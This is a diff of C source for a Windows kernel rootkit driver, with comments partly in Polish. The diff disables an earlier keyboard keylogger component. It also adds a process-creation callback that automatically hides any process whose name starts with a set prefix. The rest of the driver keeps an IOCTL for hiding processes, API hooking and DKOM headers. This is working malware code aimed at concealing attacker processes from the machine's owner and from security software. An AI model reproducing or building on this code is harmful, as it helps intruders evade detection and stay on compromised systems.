@@ -2,7 +2,7 @@
 
 #include "rootkit.h"
 #include "rk_Tools.h"
-#include "rk_keyboard.h"
+//#include "rk_keyboard.h"
 #include "rk_DKOM.h"
 #include "rk_Hook.h"
 #include "IoControl.h"
@@ -11,8 +11,8 @@
 PMODULE_ENTRY	gul_PsLoadedModuleList;  
 
 PDEVICE_OBJECT	gp_DeviceObject = NULL;
-PDEVICE_OBJECT  gp_KeyboardDevice = NULL;
-ULONG			gp_NumPendingIrps = 0;
+//PDEVICE_OBJECT  gp_KeyboardDevice = NULL;
+//ULONG			gp_NumPendingIrps = 0;
 ULONG			gp_ProcNameOffset = 0;
 PMODULE_ENTRY	gp_HiddenDriver = NULL;
 
@@ -42,16 +42,35 @@ BOOLEAN SetupOffsets();
 //Import NtBuildNumber from ntoskrnl.exe
 __declspec(dllimport) ULONG NtBuildNumber;
 
+
 VOID ProcessNotify(
 	IN HANDLE  hParentId, 
 	IN HANDLE  hProcessId, 
 	IN BOOLEAN bCreate
 	)
 {
-    if (bCreate)
-        DbgPrint("On process create PID=%ld\n",hProcessId);
+    PEPROCESS eproc = NULL;
+    PCHAR processName = NULL;
+    
+    if (bCreate) {
+       PsLookupProcessByProcessId( hProcessId , &eproc );
+       if (eproc != NULL) {
+          ULONG len = 0;
+          len = strlen(masterPrefix);
+  		  processName = (PCHAR) ( (ULONG)eproc + offsets.nameOffset );
+  		  if (processName!= NULL) {
+    		  if (strlen(processName) >= len) {
+                  if (RtlCompareMemory( processName, masterPrefix, len ) == len) {
+    //                DbgPrint("OnProcessHide\n");
+                    OnProcessHide( (ULONG)hProcessId );                     
+                  }
+              }
+          }
+       }
+       DbgPrint("On process create PID=%ld\n",hProcessId);
+    }
     else
-        DbgPrint("On process destroy PID=%ld\n",hProcessId); 
+       DbgPrint("On process destroy PID=%ld\n",hProcessId); 
         
     return;    
 }
@@ -91,30 +110,30 @@ VOID OnUnload( IN PDRIVER_OBJECT DriverObject )
 	UnHookApis();
 
 	//Detach from the device underneath that we're hooked to
-	IoDetachDevice(devExt->PrevDevice);
+//	IoDetachDevice(devExt->PrevDevice);
 
-	DbgPrint("Keyboard device detached");
+//	DbgPrint("Keyboard device detached");
 
 	//Create a timer
-	timeout.QuadPart = 1000000; //.1 s
-	KeInitializeTimer(&kTimer);
+//	timeout.QuadPart = 1000000; //.1 s
+//	KeInitializeTimer(&kTimer);
 
-	DbgPrint("Pending IRPs: %d\n",gp_NumPendingIrps);
-	
-	while(gp_NumPendingIrps > 0)
-	{
-		//Set the timer
-		KeSetTimer(&kTimer,timeout,NULL);
-		KeWaitForSingleObject(&kTimer, Executive, KernelMode, FALSE, NULL);
-	}
-		
-	devExt->bThreadRunning = FALSE; //we are stoping working thread
+//	DbgPrint("Pending IRPs: %d\n",gp_NumPendingIrps);
+//	
+//	while(gp_NumPendingIrps > 0)
+//	{
+//		//Set the timer
+//		KeSetTimer(&kTimer,timeout,NULL);
+//		KeWaitForSingleObject(&kTimer, Executive, KernelMode, FALSE, NULL);
+//	}
+//		
+//	devExt->bThreadRunning = FALSE; //we are stoping working thread
 
-	KeReleaseSemaphore(&devExt->semaphore, 0, 1, TRUE);
+//	KeReleaseSemaphore(&devExt->semaphore, 0, 1, TRUE);
 
-	DbgPrint("Waiting for key logger thread to terminate...\n");
-	KeWaitForSingleObject(devExt->pThread, Executive, KernelMode, TRUE, NULL);
-	DbgPrint("Key logger thread termintated\n");
+//	DbgPrint("Waiting for key logger thread to terminate...\n");
+//	KeWaitForSingleObject(devExt->pThread, Executive, KernelMode, TRUE, NULL);
+//	DbgPrint("Key logger thread termintated\n");
 
 	//Close the log file
 	ZwClose( devExt->hLogFile );
@@ -126,7 +145,7 @@ VOID OnUnload( IN PDRIVER_OBJECT DriverObject )
 	RtlInitUnicodeString( &symbolicLink, ROOTKIT_WIN32_DEV_NAME );
 	IoDeleteSymbolicLink( &symbolicLink );
 
-	IoDeleteDevice(gp_KeyboardDevice);
+//	IoDeleteDevice(gp_KeyboardDevice);
 	IoDeleteDevice(gp_DeviceObject);
 
 	//Delete the device
@@ -149,10 +168,10 @@ NTSTATUS  Driver_IoControl( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )
 	ULONG controlCode;
 	PVOID pInputBuffer;
 
-	if ( DeviceObject == gp_KeyboardDevice ) {
-		//tutaj przekazujemy Irp dla nastepnego w lanuchu drivera
-		return CompleteKeyboard(Irp);
-	}
+//	if ( DeviceObject == gp_KeyboardDevice ) {
+//		//tutaj przekazujemy Irp dla nastepnego w lanuchu drivera
+//		return CompleteKeyboard(Irp);
+//	}
 
 	//now we only service OUR driver IOCTLS
 
@@ -173,7 +192,6 @@ NTSTATUS  Driver_IoControl( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )
 
 	case IOCTL_HIDE_PROCESS:
 		DbgPrint("Before IOCTL_HIDE_PROCESS\n");
-//		__asm int 3
 		if (inputSize == sizeof(ULONG)) {
 			DbgPrint("Lets hide something...");
 			OnProcessHide( *(ULONG*)pInputBuffer );
@@ -215,7 +233,7 @@ NTSTATUS DriverEntry( IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING theRegi
     }
 
 	//do obslugi klawiatury
-	driverObject->MajorFunction[IRP_MJ_READ				] =	KeyBoardDispatchRead;
+//	driverObject->MajorFunction[IRP_MJ_READ				] =	KeyBoardDispatchRead;
 	
 	//
 	driverObject->MajorFunction[ IRP_MJ_CREATE			] = OnDriverCreate;
@@ -270,8 +288,8 @@ NTSTATUS DriverEntry( IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING theRegi
 	gp_DeviceObject = driverObject->DeviceObject;
 
     //tutaj tworzymy urzadzenie dla klawiatury oraz inicjujemy
-	KeyboardInit( driverObject, &gp_KeyboardDevice);
-	SetupKeylogger( gp_KeyboardDevice );	
+//	KeyboardInit( driverObject, &gp_KeyboardDevice);
+//	SetupKeylogger( gp_KeyboardDevice );	
 
 	//setup specific system characterisitc
 	gp_ProcNameOffset  = GetProcessNameOffset();
@@ -329,30 +347,45 @@ NTSTATUS DispatchGeneral(IN PDEVICE_OBJECT DeviceObject,IN PIRP Irp)
 		DbgPrint("Dispach general: DeviceObject: %x \n",DeviceObject);
 		return CompleteRequest(Irp);
 	}
-
-	// ten IRP jest dla klawiatury
-
-    //
-    // Przepuszczamy IRP do nastepnego drivera w lancuch bez modyfikowania
-    //
-	else
-	if (DeviceObject == gp_KeyboardDevice) {
-		DbgPrint("Dispach general: KeyboardDeviceObject: %x \n",DeviceObject);
-		return CompleteKeyboard( Irp );
-	}
-	else
-		DbgPrint("Dispach general else: DeviceObject: %x \n",DeviceObject);
-
-	// to sie nie powinno wywolywac NIGDY !
-    IoSkipCurrentIrpStackLocation(Irp);
-    return IoCallDriver(((PROOTKIT_EXT) DeviceObject->DeviceExtension)->PrevDevice, Irp);
+	
+    DbgPrint("TO SIE NIE POWINNO WYWOLAC NIGDY\n");
+ 
+    return STATUS_UNSUCCESSFUL; 
+//	// ten IRP jest dla klawiatury
+//
+//    //
+//    // Przepuszczamy IRP do nastepnego drivera w lancuch bez modyfikowania
+//    //
+//	else
+//	if (DeviceObject == gp_KeyboardDevice) {
+//		DbgPrint("Dispach general: KeyboardDeviceObject: %x \n",DeviceObject);
+//		return CompleteKeyboard( Irp );
+//	}
+//	else
+//		DbgPrint("Dispach general else: DeviceObject: %x \n",DeviceObject);
+//
+//	// to sie nie powinno wywolywac NIGDY !
+//    IoSkipCurrentIrpStackLocation(Irp);
+//    return IoCallDriver(((PROOTKIT_EXT) DeviceObject->DeviceExtension)->PrevDevice, Irp);
 }
 
-NTSTATUS CompleteKeyboard(IN PIRP Irp)
-{
-	IoSkipCurrentIrpStackLocation(Irp);
-	return IoCallDriver(((PROOTKIT_EXT)gp_KeyboardDevice)->PrevDevice, Irp);
-}
+//NTSTATUS CompleteKeyboard(IN PIRP Irp)
+//{
+//    NTSTATUS stat = STATUS_SUCCESS;
+//	IoSkipCurrentIrpStackLocation(Irp);
+//	__try
+//    {
+////  	      status = IoCallDriver(((PROOTKIT_EXT)gp_KeyboardDevice)->PrevDevice, Irp);
+//  	      stat = IoCallDriver(((PROOTKIT_EXT)gp_KeyboardDevice->DeviceExtension)->PrevDevice, Irp);
+//    }
+//    __except (EXCEPTION_EXECUTE_HANDLER) 
+//    {
+//          DbgPrint("!!!! HANDLED EXCEPTION   !!!!\n");
+//          stat = STATUS_UNSUCCESSFUL;
+//    }
+//
+//	return stat;
+//}
 
 BOOLEAN SetupOffsets(ULONG nameOffset)
 {
